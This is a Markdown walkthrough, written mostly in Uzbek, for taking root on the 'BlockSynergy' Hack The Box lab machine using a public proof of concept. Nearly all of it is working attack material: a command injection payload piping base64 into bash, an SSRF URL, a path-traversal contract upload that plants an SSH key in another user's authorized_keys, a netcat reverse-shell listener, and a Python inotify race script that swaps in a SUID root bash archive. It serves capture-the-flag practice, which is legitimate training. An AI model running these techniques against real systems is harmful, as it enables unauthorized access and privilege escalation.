# ⏱️ BlockSynergy — 20 DAQIQA PLAYBOOK (root flag)

Manba: ochiq PoC `shervinbruce1190/Blocksynergy` (`block.py` + `main.txt`).
**Bu to'liq avtomatik exploit** — men o'zim "noaniq" degan joylar shu yerda aniq.

## 0. Tayyorgarlik (60 sekund)

```bash
cd htb-blocksynergy/poc
pip3 install requests --break-system-packages 2>/dev/null || pip3 install requests

# tun0 IP ni aniqlang (HTB VPN)
ip -4 addr show tun0 | grep -oP 'inet \K[\d.]+'
LHOST=<shu_IP>          # masalan 10.10.17.223
```

`block.py` patch qilingan: endi **o'z SSH kalitingizni** o'zi generatsiya qiladi.

---

## YO'L A — walter shell allaqachon bor bo'lsa (ENG TEZ, ~5 daqiqa)

Agar sizda hozir walter shell ochiq bo'lsa, `main.txt` qadamlarini bajaring:

### A1. Kali'da SSH kalit
```bash
rm -f /tmp/hank_key /tmp/hank_key.pub
ssh-keygen -t rsa -b 4096 -f /tmp/hank_key -N "" -q
cat /tmp/hank_key.pub          # nusxa oling
```

### A2. Pwn contract (public keyni qo'ying)
```bash
cat > /tmp/pwn_contract.json << 'EOF'
{
  "name": "pwn", "id": 1, "owner": "Developer",
  "logic": { "claim": "allow" },
  "debug": "True",
  "hooks": { "on_claim": "log" },
  "__meta__": {
    "log_file": "../../../../home/hank/.ssh/authorized_keys",
    "log_content": { "on_claim": "\nssh-rsa <PUBLIC_KEY_HERE>\n" }
  }
}
EOF
```

### A3. walter shell ichida yuklash
```bash
curl -c /tmp/flask_cookies -b /tmp/flask_cookies \
  -X POST http://127.0.0.1:5000/dashboard \
  -F "action=upload_contract" \
  -F "contract_file=@/tmp/pwn_contract.json"
```

### A4. Hank sifatida SSH
```bash
ssh -i /tmp/hank_key -o StrictHostKeyChecking=no hank@blocksynergy.htb
```

### A5. SUID arxiv
```bash
tar --owner=0 --group=0 --mode=4755 \
  --transform='s|^bash$|opt/blocksynergy/.diag|' \
  -czf /tmp/restore_suid.tar.gz -C /bin bash
```

### A6. Restore'ni trigger qilish + SWAP (hank shell ichida)
```bash
python3 << 'EOF'
import ctypes, os, struct, time, sys
WATCH_DIR, TARGET, MAL = "/var/restore_work", "_opt_blocksynergy.tar.gz", "/tmp/restore_suid.tar.gz"
TRIGGER = "/opt/blocksynergy/restore"
IN_CREATE, IN_CLOSE_WRITE, IN_CLOSE_NOWRITE, IN_MOVED_TO = 0x100, 0x8, 0x10, 0x80
libc = ctypes.CDLL("libc.so.6")
fd = libc.inotify_init1(0)
libc.inotify_add_watch(fd, WATCH_DIR.encode(), IN_CREATE|IN_CLOSE_WRITE|IN_CLOSE_NOWRITE|IN_MOVED_TO)
try: os.unlink(TRIGGER)
except: pass
open(TRIGGER, "w").close(); print("[+] restore triggered")
down = False; start = time.time()
while time.time() - start < 120:
    data = os.read(fd, 8192); off = 0
    while off + 16 <= len(data):
        wd, mask, cookie, nlen = struct.unpack_from("iIII", data, off); off += 16
        name = data[off:off+nlen].split(b"\x00",1)[0].decode(errors="ignore"); off += nlen
        if name != TARGET: continue
        if mask & (IN_CREATE|IN_MOVED_TO): print("[+] archive appeared:", name)
        if mask & IN_CLOSE_WRITE: print("[+] download finished"); down = True
        if (mask & IN_CLOSE_NOWRITE) and down:
            os.replace(MAL, os.path.join(WATCH_DIR, TARGET)); print("[+] SWAP SUCCESS"); sys.exit(0)
print("[-] timeout - qayta urinib ko'ring")
EOF
```

### A7. ROOT FLAG
```bash
/opt/blocksynergy/.diag -p -c "id; cat /root/root.txt"
```

---

## YO'L B — hammasi noldan (avtomatik)

```bash
# Terminal 1 — listener
nc -lvnp 4444

# Terminal 2 — exploit
cd htb-blocksynergy/poc
python3 block.py --lhost $LHOST --lport 4444
```

Skript sizdan 2 marta Enter bosishni so'raydi:
1. listener tayyor bo'lganda → Enter
2. Walter shell olgach (`test_node/1` trigger qilinadi, `nc` da shell paydo bo'ladi) → Enter

Keyin Phase 3 → Hank SSH → Phase 4 → race (trigger: `touch /opt/blocksynergy/restore`) → Phase 5 → root flag.

> Faqat hank'dan boshlash kerak bo'lsa: `python3 block.py --lhost $LHOST --skip-shell`

---

## Aniqlangan tafsilotlar (avval noaniq edi)

| Element | Aniq qiymat |
|---|---|
| Command injection payload | `http://x;echo <b64>\|base64 -d\|bash;a@0.0.0.0:8080/` |
| SSRF URL | `http://0.0.0.0:8080/admin/nodes/manage?action=ping_node&target=<urlencoded mal_node>` |
| Trigger | `GET /dashboard/vip/nodes/test_node/1` |
| Contract traversal | `../../../../home/hank/.ssh/authorized_keys` |
| Contract upload | `POST http://127.0.0.1:5000/dashboard -F action=upload_contract` |
| Staging papka | `/var/restore_work/` |
| Restore trigger | **`touch /opt/blocksynergy/restore`** (cron kutish yo'q!) |
| Kuzatiladigan fayl | `_opt_blocksynergy.tar.gz` |
| SUID binary | `/opt/blocksynergy/.diag` |
| SUID yasash | `tar --owner=0 --group=0 --mode=4755 --transform='s\|^bash$\|opt/blocksynergy/.diag\|'` |
| Flag | `/opt/blocksynergy/.diag -p -c "cat /root/root.txt"` |

## Muammo bo'lsa

| Belgi | Yechim |
|---|---|
| `test_node/1` ishlamadi | `test_node/2` ni ham sinang (ID tartibi o'zgaradi) |
| SSH banner kelib osiladi | `sudo ip link set dev tun0 mtu 1300` |
| Swap bo'lmadi | skriptni qayta ishga tushiring; `touch` trigger qayta ishlaydi |
| `.diag` yo'q | `ls -la /var/restore_work/`; restore tsiklini qayta trigger qiling |
| `ModuleNotFoundError: requests` | `pip3 install requests --break-system-packages` |
